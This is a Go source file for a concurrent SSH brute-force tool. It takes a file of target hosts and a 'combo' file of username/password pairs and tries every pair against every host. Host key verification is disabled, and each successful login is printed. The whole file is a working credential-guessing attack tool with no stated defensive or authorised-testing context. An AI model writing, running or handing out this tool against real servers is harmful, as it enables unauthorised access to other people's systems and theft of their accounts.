package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"strings"
	"sync"
)

type LoginPair struct {
	Login string
	Pass  string
}

func main() {
	hostsFile := flag.String("hosts", "", "Path to the hosts file")
	comboFile := flag.String("combo", "", "Path to the combo file")
	conc := flag.Int("conc", 1, "Number of concurrent threads")
	flag.Parse()

	pairs := loadLoginData(*comboFile)
	targets := loadTargets(*hostsFile)

	startBrute(targets, pairs, *conc)

}

func startBrute(targets []string, authData []LoginPair, threads int) {
	var wg sync.WaitGroup
	results := make(chan string, len(targets)*len(authData))
	semaphore := make(chan struct{}, threads)

	for _, target := range targets {
		for _, auth := range authData {
			wg.Add(1)
			semaphore <- struct{}{}
			go func(target string, auth LoginPair) {
				defer wg.Done()
				defer func() { <-semaphore }()
				if trySSHAuth(target, auth) {
					results <- fmt.Sprintf("Success: %s with %s:%s", target, auth.Login, auth.Pass)
				}
			}(target, auth)
		}
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		fmt.Println(result)
	}
}

func trySSHAuth(target string, authInfo LoginPair) bool {
	config := &ssh.ClientConfig{
		User: authInfo.Login,
		Auth: []ssh.AuthMethod{
			ssh.Password(authInfo.Pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		log.Printf("Failed to connect: %s", err)
		return false
	}
	defer client.Close()

	return true
}

func loadLoginData(path string) []LoginPair {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("Error with opening combos")
	}

	pairs := make([]LoginPair, 0)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()

		parts := strings.Split(line, " ")

		if len(parts) == 2 {
			loginPair := LoginPair{Login: parts[0], Pass: parts[1]}
			pairs = append(pairs, loginPair)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return pairs
}

func loadTargets(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("Error with opening targets")
	}

	targets := make([]string, 0)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		targets = append(targets, line)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return targets
}
